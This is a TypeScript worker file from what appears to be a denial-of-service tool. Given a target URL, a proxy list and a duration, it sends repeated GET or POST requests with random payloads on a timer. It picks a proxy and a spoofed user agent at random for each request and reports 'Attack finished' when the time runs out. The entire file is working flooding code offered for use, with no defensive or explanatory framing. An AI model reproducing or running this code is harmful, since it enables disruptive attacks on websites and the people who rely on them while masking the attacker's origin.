import { parentPort, workerData } from "node:worker_threads";

import { createMimicHttpClient } from "../../clients/http.ts";
import { getRandomUserAgent } from "../../utils/random.ts";
import process from "node:process";
import { generateRandomString } from "../../utils/random.ts";
const startAttack = () => {
  const { target, proxies, duration, packetDelay, packetSize } = workerData;

  const fixedTarget = target.startsWith("http") ? target : `https://${target}`;
  let totalPackets = 0;
  const startTime = Date.now();

  const sendRequest = async (
    proxy: {
      username?: any;
      password?: any;
      protocol: any;
      host: any;
      port: any;
    },
    userAgent: any,
  ) => {
    try {
      const proxyConfig = {
        protocol: proxy.protocol,
        host: proxy.host,
        port: proxy.port,
        ...(proxy.username && proxy.password
          ? { username: proxy.username, password: proxy.password }
          : {}),
      };

      const client = createMimicHttpClient(proxyConfig, userAgent);
      const isGet = packetSize > 64 ? false : 64;
      const payload = generateRandomString(packetSize);

      if (isGet) {
        await client(`${fixedTarget}/${payload}`);
      } else {
        await client(fixedTarget, { body: payload });
      }

      totalPackets++;
      parentPort?.postMessage({
        log:
          `✅ Request successful from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}`,
        totalPackets,
      });
    } catch (error: any) {
      parentPort?.postMessage({
        log:
          `❌ Request failed from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}: ${error.message}`,
        totalPackets,
      });
    }
  };

  const interval = setInterval(() => {
    const elapsedTime = (Date.now() - startTime) / 1000;

    if (elapsedTime >= duration) {
      clearInterval(interval);
      parentPort?.postMessage({ log: "Attack finished", totalPackets });
      process.exit(0);
    }

    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
    const userAgent = getRandomUserAgent();

    sendRequest(proxy, userAgent);
  }, packetDelay);
};

if (workerData) {
  startAttack();
}
